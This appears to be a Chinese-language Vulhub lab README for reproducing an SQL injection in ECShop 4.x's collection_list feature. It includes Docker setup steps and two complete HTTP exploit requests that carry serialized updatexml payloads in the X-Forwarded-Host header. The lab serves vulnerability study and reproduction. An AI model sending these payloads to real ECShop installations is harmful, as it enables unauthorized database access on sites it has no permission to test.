# ECShop 4.x Collection List SQL注入漏洞

ECShop是一个流行的开源电子商务系统。在ECShop 4.x版本的`collection_list`功能中存在SQL注入漏洞，攻击者可以通过`insert_`函数执行任意SQL查询。

参考链接：

- <https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw>
- <http://foreversong.cn/archives/1556>

## 环境搭建

执行如下命令启动ECShop 4.0.6：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:8080`进入安装向导。在安装过程中：

- 将数据库地址设置为`mysql`
- 将数据库用户名和密码都设置为`root`

## 漏洞复现

此漏洞原理与[xianzhi-2017-02-82239600](https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600)类似，可以利用任意`insert_`函数进行SQL注入。

有多个`insert_`函数可以用于漏洞利用。例如，使用`insert_user_account`：

```http
GET /user.php?act=collection_list HTTP/1.1
Host: your-ip:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf953a
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close

```

![](1.png)

注意：在尝试漏洞利用之前，必须先以普通用户身份登录。

另外，你也可以使用`insert_pay_log`，如下例所示：

```http
GET /user.php?act=collection_list HTTP/1.1
Host: 192.168.1.162:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:"1' and updatexml(1,repeat(user(),2),1) and '";|
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close

```

![](2.png)
